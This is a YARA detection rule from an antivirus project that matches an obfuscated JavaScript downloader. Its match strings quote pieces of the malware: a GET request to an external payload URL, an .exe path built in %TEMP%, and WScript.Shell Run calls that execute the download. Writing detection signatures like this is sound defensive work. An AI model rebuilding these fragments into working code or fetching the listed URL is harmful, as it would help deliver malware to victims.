rule sig_20160329_6c6c8a981f05fed35d654ed5a7f22596 {
  meta:
    description = "datamaliciousorder - file 20160329_6c6c8a981f05fed35d654ed5a7f22596.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "a0ac5d897592d0fb83f009c28db39ff8a5edbb9bcccad93dd6fc69143f25ead1"

  strings:
    $s1  = "function Arpwhbrqas() {return Jrriqbnqfk[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"PkuYC1nteGE.exe\";};" fullword ascii
    $s2  = "Psxcoap[Abtkzeyei](\"GET\", \"http://vasundhara.in/ok2lka\", false);" fullword ascii
    $s3  = "do {WScript[Ygqqz](Aonynts() * 11)} while (Psxcoap[\"readystate\"] < 2 * 2);" fullword ascii
    $s4  = "var Jrriqbnqfk = function Dnmlirooth() {return WScript[Elbtim](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Uwwlesydx(Slnwknlzmq, Mciqaoq){return Slnwknlzmq - Mciqaoq;};" fullword ascii
    $s6  = "function Iaazoiq(Sjlsngfg){Jrriqbnqfk[\"Run\"](Sjlsngfg, Uhfbryrn, Uhfbryrn);};" fullword ascii
    $s7  = "function Jrwojbp() {return ((Rrbpywdz == true) && (Rrbpywdz == Vbeynrhuw)) ? 1 : Uhfbryrn;};" fullword ascii
    $s8  = "function Aonynts(){return 22;};" fullword ascii
    $s9  = "var Vbeynrhuw = false;" fullword ascii
    $s10 = "function Psqhflpzww(Zqaxprrr) {var Mgmvuukcs = (1, 2, 3, 4, 5, Zqaxprrr); return Mgmvuukcs;};" fullword ascii
    $s11 = "function Iknou(){return Fbkly;};" fullword ascii
    $s12 = "var Rrbpywdz = false;" fullword ascii
    $s13 = "function Bovgrt(){return Elbtim;};" fullword ascii
    $s14 = "var Wrbtemwd = new this[\"Date\"]();" fullword ascii
    $s15 = "function Rxrcsej()" fullword ascii
    $s16 = "return Uwwlesydx(Ghpkya, Ljgtkhg);" fullword ascii
    $s17 = "Vbeynrhuw = true; " fullword ascii
    $s18 = " while (Qmkjzoj){" fullword ascii
    $s19 = "var Nopgn = false;" fullword ascii
    $s20 = "Rrbpywdz = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}